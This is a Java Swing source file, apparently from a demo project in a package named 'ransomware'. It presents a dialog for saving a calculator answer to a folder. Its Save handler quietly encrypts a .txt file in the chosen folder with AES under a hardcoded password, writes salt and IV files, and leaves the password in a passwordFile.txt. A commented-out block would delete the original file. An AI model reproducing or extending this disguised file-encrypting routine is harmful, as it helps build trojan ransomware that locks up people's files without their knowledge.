
package ransomware;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FilenameFilter;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.security.AlgorithmParameters;
import java.security.SecureRandom;
import java.security.spec.KeySpec;
import java.util.Scanner;
import java.util.StringTokenizer;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.scene.paint.Color;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.JFileChooser;
import javax.swing.JOptionPane;


public class ChooseFolder extends javax.swing.JFrame {
    
    String answerX = ""; 
    boolean successStatus = false;
    String folderPath = "";
  
    public ChooseFolder() {
        initComponents();
        lbl_about.setVisible(false);
        lbl_close.setVisible(false);
    }
        
    public ChooseFolder(String pAnswer, boolean status){
        initComponents();
                 
        answerX = pAnswer;
        successStatus = status;
        
    }
    
    

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jPanel3 = new javax.swing.JPanel();
        jLabel4 = new javax.swing.JLabel();
        jPanel1 = new javax.swing.JPanel();
        lbl_close = new javax.swing.JLabel();
        jPanel2 = new javax.swing.JPanel();
        jPanel4 = new javax.swing.JPanel();
        lbl_closepic = new javax.swing.JLabel();
        jLabel1 = new javax.swing.JLabel();
        lbl_about = new javax.swing.JLabel();
        jPanel9 = new javax.swing.JPanel();
        jLabel5 = new javax.swing.JLabel();
        jPanel5 = new javax.swing.JPanel();
        jLabel3 = new javax.swing.JLabel();
        txt_path = new javax.swing.JTextField();
        btn_select = new javax.swing.JButton();
        btn_save = new javax.swing.JButton();

        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);
        jPanel3.setLayout(jPanel3Layout);
        jPanel3Layout.setHorizontalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 100, Short.MAX_VALUE)
        );
        jPanel3Layout.setVerticalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 100, Short.MAX_VALUE)
        );

        jLabel4.setText("jLabel4");

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setUndecorated(true);
        getContentPane().setLayout(null);

        jPanel1.setBackground(new java.awt.Color(30, 136, 229));
        jPanel1.setLayout(null);

        lbl_close.setBackground(new java.awt.Color(195, 75, 215));
        lbl_close.setFont(new java.awt.Font("Leelawadee UI Semilight", 0, 16)); // NOI18N
        lbl_close.setForeground(new java.awt.Color(178, 178, 178));
        lbl_close.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        lbl_close.setText("Close");
        jPanel1.add(lbl_close);
        lbl_close.setBounds(500, 30, 90, 20);

        jPanel2.setBackground(new java.awt.Color(25, 118, 210));
        jPanel2.setLayout(null);

        jPanel4.setBackground(new java.awt.Color(21, 101, 192));
        jPanel4.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jPanel4MouseClicked(evt);
            }
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                jPanel4MouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                jPanel4MouseExited(evt);
            }
        });
        jPanel4.setLayout(null);

        lbl_closepic.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        lbl_closepic.setIcon(new javax.swing.ImageIcon(getClass().getResource("/ransomware/ic_highlight_off_white_24dp_1x.png"))); // NOI18N
        lbl_closepic.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                lbl_closepicMouseClicked(evt);
            }
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                lbl_closepicMouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                lbl_closepicMouseExited(evt);
            }
        });
        jPanel4.add(lbl_closepic);
        lbl_closepic.setBounds(10, 10, 30, 30);

        jPanel2.add(jPanel4);
        jPanel4.setBounds(550, 0, 50, 50);

        jLabel1.setFont(new java.awt.Font("Leelawadee UI", 0, 20)); // NOI18N
        jLabel1.setForeground(new java.awt.Color(255, 255, 255));
        jLabel1.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel1.setText("CHOOSE A FOLDER TO SAVE YOUR ANSWER");
        jPanel2.add(jLabel1);
        jLabel1.setBounds(90, 10, 410, 30);

        lbl_about.setBackground(new java.awt.Color(195, 75, 215));
        lbl_about.setFont(new java.awt.Font("Leelawadee UI Semilight", 0, 16)); // NOI18N
        lbl_about.setForeground(new java.awt.Color(178, 178, 178));
        lbl_about.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        lbl_about.setText("About Me");
        jPanel2.add(lbl_about);
        lbl_about.setBounds(20, 30, 90, 20);

        jPanel9.setBackground(new java.awt.Color(21, 101, 192));
        jPanel9.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jPanel9MouseClicked(evt);
            }
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                jPanel9MouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                jPanel9MouseExited(evt);
            }
        });
        jPanel9.setLayout(null);

        jLabel5.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel5.setIcon(new javax.swing.ImageIcon(getClass().getResource("/ransomware/ic_person_white_24dp_1x.png"))); // NOI18N
        jLabel5.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jLabel5MouseClicked(evt);
            }
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                jLabel5MouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                jLabel5MouseExited(evt);
            }
        });
        jPanel9.add(jLabel5);
        jLabel5.setBounds(10, 10, 30, 30);

        jPanel2.add(jPanel9);
        jPanel9.setBounds(0, 0, 50, 50);

        jPanel1.add(jPanel2);
        jPanel2.setBounds(0, 0, 600, 50);

        jPanel5.setBackground(new java.awt.Color(30, 136, 229));
        jPanel5.setLayout(null);

        jLabel3.setFont(new java.awt.Font("Leelawadee UI", 0, 14)); // NOI18N
        jLabel3.setForeground(new java.awt.Color(255, 255, 255));
        jLabel3.setText("Destination File Path");
        jLabel3.setToolTipText("");
        jPanel5.add(jLabel3);
        jLabel3.setBounds(10, 40, 140, 30);

        txt_path.setFont(new java.awt.Font("Leelawadee UI", 0, 14)); // NOI18N
        txt_path.setFocusCycleRoot(true);
        txt_path.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                txt_pathActionPerformed(evt);
            }
        });
        jPanel5.add(txt_path);
        txt_path.setBounds(150, 40, 440, 30);

        btn_select.setBackground(new java.awt.Color(29, 96, 229));
        btn_select.setFont(new java.awt.Font("Leelawadee UI", 0, 16)); // NOI18N
        btn_select.setForeground(new java.awt.Color(255, 255, 255));
        btn_select.setText("Select Folder");
        btn_select.setBorderPainted(false);
        btn_select.setContentAreaFilled(false);
        btn_select.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btn_select.setOpaque(true);
        btn_select.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                btn_selectMouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                btn_selectMouseExited(evt);
            }
        });
        btn_select.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btn_selectActionPerformed(evt);
            }
        });
        jPanel5.add(btn_select);
        btn_select.setBounds(230, 90, 200, 40);

        btn_save.setBackground(new java.awt.Color(29, 96, 229));
        btn_save.setFont(new java.awt.Font("Leelawadee UI", 0, 16)); // NOI18N
        btn_save.setForeground(new java.awt.Color(255, 255, 255));
        btn_save.setText("Save");
        btn_save.setBorderPainted(false);
        btn_save.setContentAreaFilled(false);
        btn_save.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btn_save.setEnabled(false);
        btn_save.setOpaque(true);
        btn_save.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseEntered(java.awt.event.MouseEvent evt) {
                btn_saveMouseEntered(evt);
            }
            public void mouseExited(java.awt.event.MouseEvent evt) {
                btn_saveMouseExited(evt);
            }
        });
        btn_save.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btn_saveActionPerformed(evt);
            }
        });
        jPanel5.add(btn_save);
        btn_save.setBounds(280, 150, 110, 40);

        jPanel1.add(jPanel5);
        jPanel5.setBounds(0, 50, 600, 230);

        getContentPane().add(jPanel1);
        jPanel1.setBounds(0, 0, 600, 280);

        setSize(new java.awt.Dimension(600, 280));
        setLocationRelativeTo(null);
    }// </editor-fold>//GEN-END:initComponents

    private void jLabel5MouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jLabel5MouseClicked
        new AboutMe().setVisible(true);
    }//GEN-LAST:event_jLabel5MouseClicked

    private void jLabel5MouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jLabel5MouseEntered
        lbl_about.setVisible(true);
    }//GEN-LAST:event_jLabel5MouseEntered

    private void jLabel5MouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jLabel5MouseExited
        lbl_about.setVisible(false);
    }//GEN-LAST:event_jLabel5MouseExited

    private void jPanel9MouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jPanel9MouseClicked
        new AboutMe().setVisible(true);
    }//GEN-LAST:event_jPanel9MouseClicked

    private void jPanel9MouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jPanel9MouseEntered
        lbl_about.setVisible(true);
    }//GEN-LAST:event_jPanel9MouseEntered

    private void jPanel9MouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jPanel9MouseExited
        lbl_about.setVisible(false);
    }//GEN-LAST:event_jPanel9MouseExited

    private void lbl_closepicMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_lbl_closepicMouseClicked
        this.dispose();
    }//GEN-LAST:event_lbl_closepicMouseClicked

    private void lbl_closepicMouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_lbl_closepicMouseEntered
        lbl_close.setVisible(true);
    }//GEN-LAST:event_lbl_closepicMouseEntered

    private void lbl_closepicMouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_lbl_closepicMouseExited
        lbl_close.setVisible(false);
    }//GEN-LAST:event_lbl_closepicMouseExited

    private void jPanel4MouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jPanel4MouseClicked
        this.dispose();
    }//GEN-LAST:event_jPanel4MouseClicked

    private void jPanel4MouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jPanel4MouseEntered
        lbl_close.setVisible(true);
    }//GEN-LAST:event_jPanel4MouseEntered

    private void jPanel4MouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jPanel4MouseExited
        
        lbl_close.setVisible(false);
        
    }//GEN-LAST:event_jPanel4MouseExited

    private void txt_pathActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_txt_pathActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_txt_pathActionPerformed

    private void btn_selectMouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_btn_selectMouseEntered
        // TODO add your handling code here:
    }//GEN-LAST:event_btn_selectMouseEntered

    private void btn_selectMouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_btn_selectMouseExited
        // TODO add your handling code here:
    }//GEN-LAST:event_btn_selectMouseExited

    private void btn_selectActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btn_selectActionPerformed
               
        JFileChooser fileChooser = new JFileChooser();
        //fileChooser.setCurrentDirectory(new File(System.getProperty("user.home")));
        fileChooser.setCurrentDirectory(new java.io.File("."));         //set the dialog box initial folder to current directory
        int result = fileChooser.showOpenDialog(this);
        
        fileChooser.setDialogTitle("Choose a Folder");                  //set name to JFileChooser dialog box
        fileChooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
        fileChooser.setAcceptAllFileFilterUsed(false);

        if (fileChooser.showOpenDialog(null) == JFileChooser.APPROVE_OPTION) {
            System.out.println("getCurrentDirectory(): " + fileChooser.getCurrentDirectory());
            folderPath = fileChooser.getSelectedFile().getAbsolutePath();               //get the selected folder's absolute path
            txt_path.setText(folderPath);
            System.out.println("Folder Path = " + folderPath);
            
        } 
        else {
            System.out.println("No Selection ");
        }

        btn_save.setEnabled(true);
        
          
    }//GEN-LAST:event_btn_selectActionPerformed

    private void btn_saveMouseEntered(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_btn_saveMouseEntered
        // TODO add your handling code here:
    }//GEN-LAST:event_btn_saveMouseEntered

    private void btn_saveMouseExited(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_btn_saveMouseExited
        // TODO add your handling code here:
    }//GEN-LAST:event_btn_saveMouseExited

    private void btn_saveActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btn_saveActionPerformed
        
        String password = "nimz@123456789";     // password to encrypt the file
        
        try{
        
            //*****************file encryption part***************************************
            //****************************************************************************
            
                         
            //-----search for the .txt files in the selected directory---------
            String filename = "";                           //variable to store file name with the extension
            File dir = new File(folderPath);                       //specify the user selected directory .
            
                //get the list of file names ends with .txt extension
            FilenameFilter filter = new FilenameFilter() {
                public boolean accept (File dir, String name) { 
                    return name.endsWith(".txt");
                } 
            }; 
            String[] children = dir.list(filter);
                //get the file name from files list
            if (children == null) {
                System.out.println("Either dir does not exist or is not a directory"); 
            } 
            else {
                int count = 0 ;
                while (count < children.length) {
                    if (!children[count].equals("passwordFile.txt")) {      //to avoid encrypting passwordFile.txt
                        filename = children[count];    
                        break;
                    }
                    System.out.println(filename);
                    count++;
                } 
            } 
                       
            
                        
            String fileNameWOExtension = "";                     //variable to store file name without extension
            
            //-----get the file name only by eleminating .txt extension-----------
            StringTokenizer fnameFull = new StringTokenizer(filename, ".");        
            int tokenCount = 0;
            while (fnameFull.hasMoreTokens() && fnameFull.countTokens()>1) {
                if (tokenCount > 0) {               //if file nae has multiple dots
                    fileNameWOExtension = fileNameWOExtension + "." + fnameFull.nextToken();
                }
                else {
                    fileNameWOExtension = fnameFull.nextToken();
                }
                System.out.println(fileNameWOExtension + "  " + tokenCount);
                tokenCount++;
            }
                        
            
            
            
            //file to be encrypted
            FileInputStream inFile = new FileInputStream(folderPath + "\\" + filename);  //specify the inputfile name before encryption

            
            // encrypted file
            FileOutputStream outFile = new FileOutputStream(folderPath + "\\" + fileNameWOExtension + ".des");   //specify the file name after encryption

            
            // password, iv and salt should be transferred to the other end
            // in a secure manner

            // salt is used for encoding
            // writing it to a file
            // salt should be transferred to the recipient securely
            // for decryption
            
            //-----generate salt value and write salt value to a file------
            byte[] salt = new byte[8];
            SecureRandom secureRandom = new SecureRandom();
            secureRandom.nextBytes(salt); 
            FileOutputStream saltOutFile = new FileOutputStream(folderPath + "\\salt.enc");
            saltOutFile.write(salt);
            saltOutFile.close();

            //-----generate a key------------------------------------------
            SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
            KeySpec keySpec = new PBEKeySpec(password.toCharArray(), salt, 65536, 256);
            SecretKey secretKey = factory.generateSecret(keySpec);
            SecretKeySpec secret = new SecretKeySpec(secretKey.getEncoded(), "AES");
            System.out.println(secret.toString());

            //-----encrypt the file with the generated dkey----------------
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, secret); 
            AlgorithmParameters params = cipher.getParameters();

            // iv adds randomness to the text and just makes the mechanism more
            // secure
            // used while initializing the cipher
            // file to store the iv
            FileOutputStream ivOutFile = new FileOutputStream(folderPath + "\\iv.enc");
            byte[] iv = params.getParameterSpec(IvParameterSpec.class).getIV();
            ivOutFile.write(iv);
            ivOutFile.close();

            //-----file encryption - write data in input file to an output file---------
            byte[] input = new byte[64];
            int bytesRead;


            while ((bytesRead = inFile.read(input)) != -1) {
                    byte[] output = cipher.update(input, 0, bytesRead);
                    if (output != null)
                            outFile.write(output);
            }

            byte[] output = cipher.doFinal();
            if (output != null)
                    outFile.write(output);

            inFile.close();
            outFile.flush();
            outFile.close();

            System.out.println("File Encrypted.");
            successStatus = true;
            
            //-----write decryption pasword and calculated answer to a txt file----------------------------
            PrintWriter writer = new PrintWriter(folderPath + "\\Answer.txt", "UTF-8");
            writer.println("Answer = " + answerX + "\n");
            writer.close();
            PrintWriter writerPass = new PrintWriter(folderPath + "\\passwordFile.txt", "UTF-8");
            writerPass.println("Decryption Password=" + password);
            writerPass.close();
            
           
            

/*            //-----delete original file---------------------------------------
            boolean fdelete = new File(folderPath + "\\" + filename).delete();

            if (fdelete) {
                System.out.println("file deleted");
            }
*/           
            
            //**************Encryption done***************************
          
            //pass the answer to the next form and display the answer form
            Answer aform = new Answer(successStatus, folderPath);
            aform.setVisible(true);
            
            //show the answer form
            this.dispose();
            
        }
        
        catch(NullPointerException e){
            JOptionPane.showMessageDialog(this, "Fill the text Feilds correctly..!", "Error!", JOptionPane.WARNING_MESSAGE);
            
        }
            
        catch(NumberFormatException e){
            JOptionPane.showMessageDialog(this, "Fill the text Feilds correctly..!", "Error!", JOptionPane.WARNING_MESSAGE);
            
        }
        
        catch(FileNotFoundException e){
            
            try{
                //-----write calculated answer to a txt file----------------------------
                PrintWriter writer = new PrintWriter(folderPath + "\\Answer.txt", "UTF-8");
                writer.println("Answer = " + answerX + "\n");
                writer.close();
            
            } 
            catch (Exception ex) {
                System.out.println(e);
            }
            
            Answer aform = new Answer(successStatus, folderPath);
            aform.setVisible(true);
            
            this.dispose();
            
        }
            
        catch(Exception e){
            JOptionPane.showMessageDialog(this, "Error..!", "Error!", JOptionPane.ERROR_MESSAGE);
            
        }
        
        
        
    }//GEN-LAST:event_btn_saveActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(ChooseFolder.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(ChooseFolder.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(ChooseFolder.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(ChooseFolder.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>
        //</editor-fold>
        //</editor-fold>
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new ChooseFolder().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton btn_save;
    private javax.swing.JButton btn_select;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JPanel jPanel3;
    private javax.swing.JPanel jPanel4;
    private javax.swing.JPanel jPanel5;
    private javax.swing.JPanel jPanel9;
    private javax.swing.JLabel lbl_about;
    private javax.swing.JLabel lbl_close;
    private javax.swing.JLabel lbl_closepic;
    private javax.swing.JTextField txt_path;
    // End of variables declaration//GEN-END:variables
}
